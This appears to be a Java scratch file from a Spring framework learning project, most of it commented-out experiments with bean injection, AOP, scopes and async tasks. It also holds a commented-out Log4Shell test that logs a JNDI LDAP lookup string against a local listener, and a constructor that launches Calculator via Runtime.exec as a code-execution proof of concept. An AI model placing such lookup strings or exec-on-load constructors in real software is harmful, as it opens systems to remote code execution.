package com.itqf.spring.bean;
import com.github.javafaker.App;
import com.itqf.spring.aop.AnnotationService;
import com.itqf.spring.aop.IMethodService;
import com.itqf.spring.aop.MethodService;
import com.itqf.spring.aware.AwareTestService;
import com.itqf.spring.aware.impl.AwareTestServiceImpl;
import com.itqf.spring.config.*;
//import org.junit.Test;
import com.itqf.spring.entity.User;
import com.itqf.spring.service.ConsumerService;
import com.itqf.spring.service.IUserService;
import com.itqf.spring.service.impl.ConsumerServiceImpl;
import com.itqf.spring.service.impl.UserServiceImpl;
import com.itqf.spring.taskscheduler.ScheduledTaskService;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.xmlbeans.impl.jam.JClass;
import org.springframework.context.ApplicationContext;
import org.springframework.context.annotation.AnnotationConfigApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;
import org.springframework.context.support.FileSystemXmlApplicationContext;

import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.List;
import java.util.Objects;


public class BeanTest{
    private static  final Logger logger= LogManager.getLogger(BeanTest.class);
    public static void main(String[] args) throws Exception {


//          ApplicationContext applicationContext = new ClassPathXmlApplicationContext("applicationContext-injection.xml");
//          Person personName = applicationContext.getBean(Person.class);

          //        Person personId = applicationContext.getBean("personId", Person.class);
//        System.out.println(personName == personId);

        //set方法注入
//        ApplicationContext context=new ClassPathXmlApplicationContext("applicationContext-injection.xml");
//
//        Person person=context.getBean("personName",Person.class);
//
//        System.out.println("person="+person.getName());
//        System.out.println("person="+person.getAge());
//        System.out.println("person="+person.getCar().getColor());
//        System.out.println("person="+person.getCar().getName());


        //构造函数注入
          //ApplicationContext context=new ClassPathXmlApplicationContext("classpath:applicationContext-injection.xml");
//          ApplicationContext context=new FileSystemXmlApplicationContext("classpath:applicationContext-injection.xml");
//
//        Person person=context.getBean("personName",Person.class);
//          System.out.println(person.getName());
//        System.out.println(person);
//        System.out.println(person.getName());
//        System.out.println(person.getCar().getName());
//        System.out.println(person.getCar().getColor());


//        ApplicationContext context=new ClassPathXmlApplicationContext("applicationContext-injection.xml");
//        Person person=context.getBean("person1",Person.class);
//        System.out.println(person);
//        System.out.println(person.getName());
//        System.out.println(person.getCar().getName());
//        System.out.println(person.getCar().getColor());

//        ApplicationContext context = new ClassPathXmlApplicationContext("applicationContext.xml");
//
//        Person person = context.getBean("personName", Person.class);
//
//        System.out.println("person = " + person);

//       ApplicationContext context = new ClassPathXmlApplicationContext("applicationContext.xml");
//
//        VentorDaoImpl person = context.getBean("ventorDaoImpl", VentorDaoImpl.class);
//
//       System.out.println("VentorDaoImpl = " + person);

//        ApplicationContext context = new ClassPathXmlApplicationContext("applicationContext.xml");
//        Person person=context.getBean("personName",Person.class);
//
        //AnnotationConfigApplicationContext annotationConfigApplicationContext=new AnnotationConfigApplicationContext(ScopeConfig.class);
//        Person annotationPerson=annotationConfigApplicationContext.getBean(Person.class);

        //20221111 aop start
//
//        AnnotationConfigApplicationContext annotationConfigApplicationContext=new AnnotationConfigApplicationContext(AopConfig.class);

        //AnnotationService annotationService=annotationConfigApplicationContext.getBean(AnnotationService.class);

//        IMethodService methodService=annotationConfigApplicationContext.getBean(IMethodService.class);

        //annotationService.add();
//        methodService.add();
//
//        annotationConfigApplicationContext.close();
        //20221111 aop end


        //20221112 scope start
//        AnnotationConfigApplicationContext annotationConfigApplicationContext=new AnnotationConfigApplicationContext(ScopeConfig.class);
//        SingletonService s1=annotationConfigApplicationContext.getBean(SingletonService.class);
//        SingletonService s2=annotationConfigApplicationContext.getBean(SingletonService.class);
//
//        PrototypeService p1=annotationConfigApplicationContext.getBean(PrototypeService.class);
//        PrototypeService p2=annotationConfigApplicationContext.getBean(PrototypeService.class);
//
//        System.out.println("s1与s2是否相等："+s1.equals(s2));
//        System.out.println("p1与p2是否相等："+p1.equals(p2));
//
//        annotationConfigApplicationContext.close();

        //20221112 scope end


        //20221112 aware start
//        AnnotationConfigApplicationContext annotationConfigApplicationContext=new AnnotationConfigApplicationContext(AwareConfig.class);
//        AwareService awareService=annotationConfigApplicationContext.getBean(AwareService.class);
//        awareService.outputResult();
//        annotationConfigApplicationContext.close();
        //20221112 aware end



        //20221112 @Async start
//        AnnotationConfigApplicationContext annotationConfigApplicationContext=new AnnotationConfigApplicationContext(TaskExecutorConfig.class);
//        AsyncTaskService asyncTaskService=annotationConfigApplicationContext.getBean(AsyncTaskService.class);
//        for(int i=0;i<10;i++)
//        {
//            asyncTaskService.executeAsyncTask(i);
//            asyncTaskService.executeAsyncTaskPlus(i);
//        }
//        //结果是并发执行而不是顺序执行。
//        annotationConfigApplicationContext.close();
        //20221112 @Async end


        //20221112 @Scheduled start
        //AnnotationConfigApplicationContext annotationConfigApplicationContext=new AnnotationConfigApplicationContext(TaskSchedulerConfig.class);



//        System.out.println("person.name"+annotationPerson.getName());
//        System.out.println("person.age"+annotationPerson.getAge());
//        System.out.println("person.ccar"+annotationPerson.getCzar());
//        annotationPerson.getCzar().log();
//        ICar aodiaodi=annotationPerson.getCzar();
//        aodiaodi.log();


//        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
//        logger.error("${jndi:ldap://127.0.0.1:1389/#Exploit}");
//        try {
//            Thread.sleep(1000);
//        } catch (Exception e) {
//
//        }


        //20230626 start

//        ApplicationContext context=new ClassPathXmlApplicationContext("ioc/services.xml","ioc/daos.xml");
//        ConsumerServiceImpl userService=context.getBean("userService",ConsumerServiceImpl.class);
//
//        System.out.println("测试注入-------------------");
//        List<User> userList=userService.findUsers(20);
//        if(Objects.nonNull(userList)) userList.stream().forEach(System.out::println);
//
//        AwareTestService awareTestService=(AwareTestService) context.getBean("awareTestService");
//        System.out.println("测试Aware---------------");
//        awareTestService.test();
//
//        AwareTestService awareTestServiceAlias=(AwareTestService) context.getBean("awareTestServiceAlias");
//        System.out.println("测试bean别名-------------------");
//        System.out.println(awareTestServiceAlias==awareTestService);//true

        //20230626 end


        //20230701 aop start
//       ApplicationContext context=new ClassPathXmlApplicationContext("applicationContext-injection.xml");
//       ConsumerService userService=context.getBean("userService",ConsumerService.class);
//       List<User> userList=userService.findUsers();
//       if(Objects.nonNull(userList)) userList.stream().forEach(System.out::println);



       //20230701 aop end

        AnnotationConfigApplicationContext annotationConfigApplicationContext=new AnnotationConfigApplicationContext(AppConfig.class);
        Person annotationPerson=annotationConfigApplicationContext.getBean(Person.class);
        annotationPerson.getCar().log();
    }


    public BeanTest(){
        try {
            String[] commands={"open","/System/Applications/Calculator.app"};
            Process pc= Runtime.getRuntime().exec(commands);
            pc.waitFor();
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }
}

